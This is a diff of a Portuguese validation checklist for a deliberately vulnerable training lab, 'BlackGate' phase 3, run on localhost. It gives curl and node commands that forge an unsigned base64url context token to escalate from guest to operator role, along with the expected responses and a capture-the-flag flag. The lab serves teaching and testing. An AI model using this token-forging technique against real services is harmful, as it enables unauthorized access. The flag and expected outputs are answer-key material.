@@ -1,4 +1,4 @@
-# Validação - Lab 05 BlackGate - Fase 2
+# Validação - Lab 05 BlackGate - Fase 3
 
 ## Escopo
 
@@ -24,21 +24,10 @@ Resultado esperado:
 - serviço `blackgate` em execução;
 - porta `8096:3000`.
 
-## Health check
+## Health e recon público
 
 ```bash
 curl -i http://localhost:8096/health
-```
-
-Resultado esperado:
-
-- HTTP 200;
-- JSON contendo `blackgate`;
-- versão `1.1.0-phase2`.
-
-## Enumeração pública
-
-```bash
 curl -i http://localhost:8096/robots.txt
 curl -i http://localhost:8096/.well-known/security.txt
 curl -i http://localhost:8096/api/status
@@ -51,26 +40,13 @@ curl -i -H "X-Debug-Token: guest-debug" http://localhost:8096/debug/ping
 
 Resultado esperado:
 
-- endpoints respondem sem login;
-- `/api/version` retorna `1.1.0-phase2`;
-- debug com header retorna diagnostics limitados;
-- nenhum segredo real é exposto.
+- endpoints antigos continuam respondendo;
+- `/health` retorna `1.2.0-phase3`;
+- `/api/version` retorna build `bg-phase3-weak-token`;
+- debug com header retorna diagnostics de contexto limitados;
+- nenhum segredo real é exposto em rota pública.
 
-## Login manual
-
-Abra:
-
-```text
-http://localhost:8096
-```
-
-Resultado esperado:
-
-- redireciona para `/login`;
-- login com `operator / operator123` funciona;
-- redireciona para `/dashboard`.
-
-## Login por terminal e APIs autenticadas
+## Login por terminal
 
 ```bash
 rm -f /tmp/bg-cookie.txt
@@ -79,18 +55,99 @@ curl -i -c /tmp/bg-cookie.txt \
   -d "username=guest" \
   -d "password=guest123" \
   -X POST http://localhost:8096/login
-
-curl -i -b /tmp/bg-cookie.txt http://localhost:8096/api/tickets/BG-1004
-curl -i -b /tmp/bg-cookie.txt http://localhost:8096/api/tickets/BG-1005
-curl -i -b /tmp/bg-cookie.txt http://localhost:8096/api/assets/api-core.internal
 ```
 
 Resultado esperado:
 
-- login retorna redirecionamento para `/dashboard`;
-- tickets com metadata retornam dados limitados;
-- asset por hostname retorna metadados;
-- não há flag final.
+- HTTP 302;
+- `Set-Cookie`;
+- redirecionamento para `/dashboard`.
+
+## Obter token de contexto
+
+```bash
+curl -i -b /tmp/bg-cookie.txt http://localhost:8096/api/context/me
+```
+
+Resultado esperado:
+
+- JSON com usuário `guest`;
+- role `guest`;
+- scope `limited`;
+- campo `context_token`.
+
+## Validar bloqueios
+
+Sem token:
+
+```bash
+curl -i -b /tmp/bg-cookie.txt http://localhost:8096/api/operator/briefing
+```
+
+Token guest padrão:
+
+```bash
+GUEST_TOKEN=$(node -e 'const p={user:"guest",role:"guest",scope:"limited",issued_by:"legacy-context-service"}; console.log(Buffer.from(JSON.stringify(p)).toString("base64url"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $GUEST_TOKEN" \
+  http://localhost:8096/api/operator/briefing
+```
+
+Resultado esperado:
+
+- sem token: erro `bad_request`;
+- token guest: erro `forbidden`.
+
+## Gerar token manipulado
+
+```bash
+TOKEN=$(node -e 'const p={user:"guest",role:"operator",scope:"operations",issued_by:"legacy-context-service"}; console.log(Buffer.from(JSON.stringify(p)).toString("base64url"))')
+echo "$TOKEN"
+```
+
+## Verificar token manipulado
+
+```bash
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  -X POST http://localhost:8096/api/context/verify
+```
+
+Resultado esperado:
+
+- `valid: true`;
+- role `operator`;
+- scope `operations`.
+
+## Acessar briefing operator
+
+```bash
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  http://localhost:8096/api/operator/briefing
+```
+
+Resultado esperado:
+
+- HTTP 200;
+- finding `weak unsigned context token`;
+- flag `FLAG{blackgate_weak_token_role_escalation_phase3}`.
+
+## Acessar metadata operator
+
+```bash
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  http://localhost:8096/api/operator/gateway-metadata
+```
+
+Resultado esperado:
+
+- gateway `gw-blackgate.local`;
+- trusted upstream `api-core.internal`;
+- hint de Fase 4;
+- sem SSRF real.
 
 ## Rotas autenticadas no navegador
 
@@ -98,36 +155,11 @@ Após login, validar:
 
 ```text
 /dashboard
+/context
 /tickets
 /assets
 /security-policy
 /logout
-```
-
-Resultado esperado:
-
-- `/dashboard` mostra cards de métricas e cards da Fase 2;
-- `/tickets` mostra tabela de tickets e links `API view`;
-- `/assets` mostra inventário e links `API view`;
-- `/security-policy` mostra política pública fictícia;
-- `/logout` encerra a sessão.
-
-## Respostas de erro JSON
-
-Sem cookie, validar:
-
-```bash
-curl -i http://localhost:8096/api/tickets/BG-1004
-curl -i http://localhost:8096/api/assets/api-core.internal
-```
-
-Resultado esperado:
-
-```json
-{
-  "error": "authentication_required",
-  "message": "Login required to access this resource."
-}
 ```
 
 ## Docker
@@ -143,33 +175,3 @@ Resultado esperado:
 
 - porta pública `8096:3000`;
 - somente o serviço web exposto.
-
-## Ausência de flags sensíveis
-
-```bash
-grep -R "fla[g]{" -n . || true
-grep -R "FLA[G]{" -n . || true
-```
-
-Resultado esperado:
-
-- nenhuma flag final exposta na Fase 2.
-
-## Arquivos principais
-
-Conferir:
-
-```text
-docker-compose.yml
-Dockerfile
-package.json
-src/server.js
-src/routes/
-src/views/
-src/public/css/style.css
-src/public/js/app.js
-README.md
-STUDENT-GUIDE.md
-WALKTHROUGH.md
-VALIDATION.md
-```
